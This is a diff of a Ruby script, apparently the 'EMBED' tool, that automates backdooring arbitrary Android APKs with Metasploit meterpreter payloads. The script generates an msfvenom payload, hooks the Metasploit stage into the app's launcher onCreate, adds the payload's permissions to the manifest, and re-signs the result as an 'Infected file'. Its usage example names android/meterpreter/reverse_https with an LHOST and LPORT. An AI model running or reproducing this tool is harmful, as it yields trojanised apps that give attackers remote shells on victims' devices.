@@ -1,7 +1,6 @@
 #!/usr/bin/env ruby
 # This script automatice the injections of metasploit payloads on arbitrary APKs.
 # The APKs file have to be vulnerable without unicode files.
-#
 
 require 'nokogiri'
 require 'fileutils'
@@ -32,7 +31,10 @@ def findlauncheractivity(amanifest)
         end
         for cat in category
             categoryname = cat.attribute('name')
-            if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
+            if (activityname = `aapt dump badging $(pwd)/original.apk | awk '/activity/{gsub("name=|'"'"'","");  print $2}'`)
+                activityname = activityname.to_s
+                return activityname
+            elsif (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                 activityname = activityname.to_s
                 unless activityname.start_with?(package)
                     activityname = package + activityname
@@ -56,9 +58,9 @@ def scrapeFilesForLauncherActivity()
 	  end
 	end
 	i=0
-        print "[?]─➤ Please choose from one of the following:\n".cyan
+  print "[?]─➤ Please choose from one of the following:\n".cyan
 	smali_files.each{|s_file|
-          print "[+]─➤ Hook point ",i,": ",s_file,"\n".green
+    print "[+]─➤ Hook point ",i,": ",s_file,"\n".green
 		i+=1
 	}
 	hook=-1
@@ -114,7 +116,7 @@ def fix_manifest()
 	add_permissions=[]
 	for permission in payload_permissions
 		if !(original_permissions.include? permission)
-                        print "[+]─➤ Adding #{permission}\n".green
+      print "[+]─➤ Adding #{permission}\n".green
 			add_permissions << permission
 		end
 	end
@@ -124,7 +126,7 @@ def fix_manifest()
 	for line in apk_mani.split("\n")
 		if (line.include? "uses-permission" and inject==0)
 			for permission in add_permissions
-				new_mani << '<uses-permission android:name="'+permission+'"/>'+"\n"
+				new_mani << "\t\t"+'<uses-permission android:name="'+permission+'"/>'+"\n"
 			end
 			new_mani << line+"\n"
 			inject=1
@@ -136,10 +138,10 @@ def fix_manifest()
 end
 
 def cleaning_up()
-  `rm -rf original 2>&1`
-  `rm -rf payload 2>&1`
-  `rm original.apk 2>&1`
-  `rm payload.apk 2>&1`
+  toClean = ["data","original","payload","original.apk","payload.apk","key.jks","payload.apk.idsig"]
+  for i in toClean do
+    `rm -rf "#{i}" 2>&1`
+  end
 end
 
 apkfile = ARGV[0]
@@ -169,7 +171,7 @@ end
 
 apk_v=`apktool`
 unless(apk_v.split()[1].include?("v2."))
-  puts "[ERR-wpktool]─➤ version #{apk_v} not supported, please download the latest 2. version from git.\n".red
+  puts "[ERR-apktool]─➤ version #{apk_v} not supported, please download the latest 2. version from git.\n".red
 	exit(1)
 end
 
@@ -181,12 +183,40 @@ begin
 	opts+=" "
 	}
 rescue
-  puts "[Usage]─➤ ruby EMBED.rb [target.apk] [msfvenom options]\n".cyan
-# #{$0} [target.apk] [msfvenom options]\n".cyan
-  puts "[ex]─➤ ruby EMBED.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
-# #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
-  puts "[ERR-msf]─➤ Error parsing msfvenom options. Exiting.\n".red
+  puts "[Usage]─➤ ".cyan,"EMBED [target.apk] [msfvenom options]\n"
+  puts "[ex]─➤ ".green,"EMBED messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
+  puts "[ERR-msf]─➤ Error parsing msfvenom options... Aborting.\n".red
 	exit(1)
+end
+
+# Set signer key file || default was maded on nov/2022 with android debugging parameters
+cleaning_up()
+passwd = nil
+print "[?]─➤ Set a keystore signer\n ╰{1}─➤ ".cyan,"Default (Android Debug key)\n ","╰{2}─➤ ".cyan,"Using your own key\n ","╰{3}─➤ ".cyan,"Create a new key\n ","╰────➤ ".cyan
+`rm -rf $(pwd)/key.jks`
+answ = $stdin.gets.to_i
+if answ<=3 and answ>0
+  case answ
+  when 2
+    print " ╰[Key-path]─➤ ".cyan
+    jksfile = $stdin.gets.chomp.to_s
+    if File.exist?("#{jksfile}")
+      `cp "#{jksfile}" $(pwd)/key.jks`
+    else
+      puts " ╰[ERR-not_found]─➤ Aborting".red
+      exit(1)
+    end
+  when 3
+    system('keytool -genkey -v -keystore userkey.jks -keyalg RSA -keysize 2048 -validity 10000 -alias debugging')
+    FileUtils.cp("userkey.jks","key.jks")
+  else
+    passwd = "android"
+    `cp .IbyC/key.jks .`
+#    system("wget --tries=20 --quiet https://raw.githubusercontent.com/ivam3/embed/master/.IbyC/key.jks -O $(pwd)/key.jks")
+  end
+else
+  puts " ╰[ERR-bad_answer]─➤ Aborting.".red
+  exit(1)
 end
 
 print "[*]─➤ Generating msfvenom payload..\n".cyan
@@ -197,31 +227,38 @@ if res.downcase.include?("invalid" || "error")
 end
 
 print "[*]─➤ Signing payload..\n".cyan
-`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/payload.apk androiddebugkey`
-`rm -rf original`
-`rm -rf payload`
+if passwd.nil? || passwd.empty?
+  print " ╰[?]─➤ ".cyan
+  #`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/payload.apk androiddebugkey`
+  system('apksigner sign --ks key.jks --ks-key-alias debugging $(pwd)/payload.apk')
+else
+  `apksigner sign --ks key.jks --ks-pass pass:#{passwd} --ks-key-alias debugging $(pwd)/payload.apk`
+end
 
-`cp #{apkfile} original.apk 2>&1`
-
+`cp #{apkfile} $(pwd)/original.apk`
 print "[*]─➤ Decompiling orignal APK..\n".cyan
-`apktool d -f -r $(pwd)/original.apk -o $(pwd)/original`
+`apktool d -f -r -o $(pwd)/original #{apkfile}`
 print "[*]─➤ Ignoring the resource decompilation..\n".cyan
-`apktool d -f $(pwd)/original.apk -o $(pwd)/original_tmp`
+`apktool d -f -o $(pwd)/original_tmp #{apkfile}`
 `cat $(pwd)/original_tmp/AndroidManifest.xml > $(pwd)/original/AndroidManifest.xml`
+minSDKversion = `grep "minSdkVersion" -R $(pwd)/original_tmp|awk -F " " '{print $NF}'`
 `rm -rf $(pwd)/original_tmp`
 print "[*]─➤ Decompiling payload APK..\n".cyan
-`apktool d $(pwd)/payload.apk -o $(pwd)/payload`
+`apktool d -f -o $(pwd)/payload $(pwd)/payload.apk`
 
 f = File.open("original/AndroidManifest.xml")
 amanifest = Nokogiri::XML(f)
 f.close
 
 print "[*]─➤ Locating onCreate() hook..\n".cyan
-
 launcheractivity = findlauncheractivity(amanifest)
-smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
+#smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
+smalif = Dir["original/**/" + launcheractivity.gsub(/\./, "/").gsub("\n", ".smali")]
+smalif = smalif.to_s
+smalifile = smalif.gsub("[", "").gsub("]", "").gsub("\"", "")
+
 begin
-	activitysmali = File.read(smalifile)
+  activitysmali = File.read(smalifile.to_s)
 rescue Errno::ENOENT
   print "[w]─➤ Unable to find correct hook automatically\n".red
 	begin
@@ -229,7 +266,8 @@ rescue Errno::ENOENT
 		smalifile=results[0]
 		activitysmali=results[1]
 	rescue
-          puts "[ERR-apk]─➤ Error finding launcher activity. Exiting".red
+    cleaning_up()
+    puts "[ERR-apk]─➤ Error finding launcher activity... Aborting".red
 		exit(1)
 	end
 end
@@ -240,9 +278,9 @@ FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'ori
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
 payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
+
 print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..\n".cyan
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
-
 injected_apk=apkfile.split(".")[0]
 injected_apk = "data/data/com_backdoored.apk"
 final_apk=apkfile.split("/")[-1]
@@ -251,23 +289,44 @@ final_apk+="_final"
 print "[*]─➤ Poisoning the manifest with meterpreter permissions..\n".cyan
 fix_manifest()
 
-print "[*]─➤ Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n".cyan
-`apktool b --use-aapt2 -o $(pwd)/#{injected_apk} $(pwd)/original`
+print "[*]─➤ Rebuilding #{apkfile}\n      with meterpreter injection as #{injected_apk}..\n".cyan
+for i in (1..3) do
+  if !File.exist?("#{injected_apk}")
+    `apktool b -f --use-aapt2 -o $(pwd)/#{injected_apk} $(pwd)/original 2>$(pwd)/.IbyC/embed.log`
+  else
+    break
+  end
+end
 
 if File.exist?("#{injected_apk}")
   print "[*]─➤ Signing #{injected_apk} ..\n".cyan
-  `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/#{injected_apk} androiddebugkey`
+  verifySigni = `apksigner verify --verbose #{injected_apk} 2>/dev/null`
+  for i in (1..3) do
+    if verifySigni.empty?
+      if passwd.nil? || passwd.empty?
+        print " ╰[?]─➤ ".cyan
+        #`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/#{injected_apk} androiddebugkey`
+        system("apksigner sign --ks key.jks --ks-key-alias debugging --min-sdk-version 23 $(pwd)/#{injected_apk}")
+      else
+        `apksigner sign --ks key.jks --ks-pass pass:#{passwd} --ks-key-alias debugging --min-sdk-version 23 $(pwd)/#{injected_apk}`
+      end
+    end
+  end
+
   print "[*]─➤ Aligning #{injected_apk} ..\n".cyan
   `zipalign -f -v 4 $(pwd)/#{injected_apk} #{final_apk}`
   cleaning_up()
-  if File.exist?("#{final_apk}")
-    puts "[+]─➤ Infected file #{final_apk} ready.\n".green
+  verifySign = `apksigner verify --verbose #{final_apk}`
+  if !verifySign.empty?
+    puts "[+]─➤ Infected file is ready in: $(pwd)/#{final_apk}.\n".green
   else
-    puts "[ERR-sign]─➤ Going at https://t.me/Ivam3_Bot".red
+    cleaning_up()
+    puts "[ERR-apksigner]─➤ Going at https://t.me/Ivam3_Bot".red,"\t╰[logfile]─➤ embed/.IbyC/embed.log".cyan
     exit(1)
   end
 else
   cleaning_up()
-  puts "[ERR-build]─➤ Going at https://t.me/Ivam3_Bot".red
+  puts "[ERR-build]─➤ Going at https://t.me/Ivam3_Bot".red,"\t╰[logfile]─➤ embed/.IbyC/embed.log".cyan
   exit(1)
 end
+
